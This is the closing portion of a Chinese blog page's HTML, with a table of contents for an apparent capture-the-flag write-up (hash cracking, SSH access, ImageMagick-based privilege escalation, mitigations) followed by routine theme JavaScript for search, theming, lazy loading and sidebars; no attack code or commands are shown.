href="#2-%E5%88%86%E6%9E%90%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%8C%E6%8F%90%E5%8F%96%E5%AF%86%E7%A0%81%E5%93%88%E5%B8%8C"><span class="toc-text">2. 分析数据库，提取密码哈希</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81%E5%93%88%E5%B8%8C"><span class="toc-text">3. 破解密码哈希</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-SSH-%E7%99%BB%E5%BD%95%E5%B9%B6%E8%8E%B7%E5%8F%96-User-Flag"><span class="toc-text">4. SSH 登录并获取 User Flag</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Root-Flag"><span class="toc-text">五、 权限提升 (Root Flag)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%9C%AC%E5%9C%B0%E6%9E%9A%E4%B8%BE"><span class="toc-text">1. 本地枚举</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%88%86%E6%9E%90%E5%8F%AF%E7%96%91%E8%84%9A%E6%9C%AC"><span class="toc-text">2. 分析可疑脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%A3%80%E6%9F%A5-ImageMagick-%E7%89%88%E6%9C%AC%E5%B9%B6%E6%9F%A5%E6%89%BE%E6%BC%8F%E6%B4%9E"><span class="toc-text">3. 检查 ImageMagick 版本并查找漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%88%B6%E4%BD%9C%E5%B9%B6%E9%83%A8%E7%BD%B2%E6%81%B6%E6%84%8F%E5%85%B1%E4%BA%AB%E5%BA%93"><span class="toc-text">4. 制作并部署恶意共享库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E7%AD%89%E5%BE%85%E8%A7%A6%E5%8F%91%E4%B8%8E%E8%8E%B7%E5%8F%96-Root-Flag"><span class="toc-text">5. 等待触发与获取 Root Flag</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AD%E3%80%81-%E6%80%BB%E7%BB%93"><span class="toc-text">六、 总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%83%E3%80%81-%E9%98%B2%E6%8A%A4%E4%B8%8E%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD"><span class="toc-text">七、 防护与缓解措施</span></a></li></ol></div><div class="widget-footer">
+
+<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel blur'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+  <script type="text/javascript">
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+  };
+  const deps = {
+    jquery: `https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js`,
+    marked: `https://cdn.jsdelivr.net/npm/marked@13.0.1/lib/marked.umd.min.js`
+  }
+  
+
+</script>
+
+    <script type="text/javascript">
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+    
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      let retryTimes = 3;
+      utils.onLoading(el);
+      function req() {
+        return new Promise((resolve, reject) => {
+          let status = 0; // 0 等待 1 完成 2 超时
+          let timer = setTimeout(() => {
+            if (status === 0) {
+              status = 2;
+              timer = null;
+              reject('请求超时');
+              if (retryTimes == 0) {
+                onFailure();
+              }
+            }
+          }, 5000);
+          fetch(url).then(function(response) {
+            if (status !== 2) {
+              clearTimeout(timer);
+              resolve(response);
+              timer = null;
+              status = 1;
+            }
+            if (response.ok) {
+              return response.json();
+            }
+            throw new Error('Network response was not ok.');
+          }).then(function(data) {
+            retryTimes = 0;
+            utils.onLoadSuccess(el);
+            callback(data);
+          }).catch(function(error) {
+            if (retryTimes > 0) {
+              retryTimes -= 1;
+              setTimeout(() => {
+                req();
+              }, 5000);
+            } else {
+              utils.onLoadFailure(el);
+              onFailure();
+            }
+          });
+        });
+      }
+      req();
+    },
+  };
+</script>
+
+      <script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+        <script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+
+          <!-- required -->
+          <script src="/js/main.js?v=1.29.1" defer></script>
+
+          <script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    applyThemeToGiscus(theme)
+  }
+
+  const applyThemeToGiscus = (theme) => {
+    theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+      auto: `切换到跟随系统配色`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    }
+  })()
+</script>
+
+
+            <!-- optional -->
+            
+
+
+              <script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+  });
+</script>
+                
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@19.1.3/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+</script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error)';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const els = document.getElementsByClassName('ds-memos');
+    if (els != undefined && els.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+
+
+
+                  <!-- inject -->
+                  
+
+                    <!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/highlight.min.js"></script>
+                    <script>
+                      hljs.highlightAll();  // 这段代码会自动找到页面中所有的代码块并进行高亮
+                    </script> --><script src="/js/plugins/copycode.js"></script>
+    <script type="text/javascript" 
+      color="220,220,220" 
+      opacity="0.7" 
+      zIndex="-2" 
+      count="200" 
+      src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+    </script>
+  </div></body></html>
